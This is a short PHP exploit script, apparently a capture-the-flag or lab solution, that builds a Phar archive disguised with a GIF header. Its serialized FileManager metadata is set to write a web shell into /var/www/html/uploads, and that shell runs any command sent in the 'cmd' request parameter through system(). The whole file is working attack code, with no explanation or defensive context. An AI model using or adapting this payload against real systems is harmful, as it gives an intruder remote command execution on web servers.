<?php

class FileManager {
    public $name = '';
    public $content = '';
    public $mode = '';
}

// @unlink("csb21698.phar");
$phar = new Phar('csb21698.phar');
$phar -> startBuffering();
$phar -> setStub('GIF87a'.'<?php __HALT_COMPILER();?>');
$object = new FileManager();
$object -> name = '/var/www/html/uploads/csb21698.php';
$object -> content = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = $_REQUEST["cmd"]; system($cmd); echo "</pre>"; die; }?>';
$object -> mode = 'upload';
$phar -> setMetadata($object);
$phar -> addFromString('test.txt','test');
$phar -> stopBuffering();

?>